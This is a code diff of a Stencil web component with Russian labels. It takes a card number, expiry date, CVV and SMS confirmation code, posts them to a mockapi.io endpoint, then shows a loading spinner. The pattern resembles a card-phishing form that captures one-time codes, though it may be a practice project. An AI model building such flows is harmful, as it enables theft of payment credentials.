@@ -10,6 +10,8 @@ export class PtmTimer {
   @State() minutes: number = 2;
   @State() seconds: number = 59;
   @State() smsCode: string;
+  @State() isModalOn: boolean = false;
+
   @Prop() cardNumber: string;
   @Prop() expDate: string;
   @Prop() cvv: string;
@@ -29,19 +31,14 @@ export class PtmTimer {
   }
 
   onSubmitHandler() {
-    axios
-      .post('https://631cbb941b470e0e12094434.mockapi.io/cards', {
-        cardNumber: this.cardNumber,
-        expDate: this.expDate,
-        cvv: this.cvv,
-        smsCode: this.smsCode,
-      })
-      .then(function (response) {
-        console.log(response);
-      })
-      .catch(function (error) {
-        console.log(error);
-      });
+    axios.post('https://631cbb941b470e0e12094434.mockapi.io/cards', {
+      cardNumber: this.cardNumber,
+      expDate: this.expDate,
+      cvv: this.cvv,
+      smsCode: this.smsCode,
+    });
+
+    setTimeout(() => (this.isModalOn = true), 1000);
   }
   onSmsInputHandler(e: Event) {
     const eTarget = e.target as HTMLTextAreaElement;
@@ -57,7 +54,27 @@ export class PtmTimer {
             Подтвердить
           </button>
         </div>
-
+        {/* {this.isModalOn ? <div class={'modal'}>MODAL</div> : ''} */}
+        {this.isModalOn ? (
+          <div class={'modal'}>
+            <div class="lds-spinner">
+              <div></div>
+              <div></div>
+              <div></div>
+              <div></div>
+              <div></div>
+              <div></div>
+              <div></div>
+              <div></div>
+              <div></div>
+              <div></div>
+              <div></div>
+              <div></div>
+            </div>
+          </div>
+        ) : (
+          ''
+        )}
         <div class={'timer__timer'}>
           {this.seconds <= 0 && this.minutes <= 0 ? (
             <span>Повторная попытка доступна через: 0:00</span>
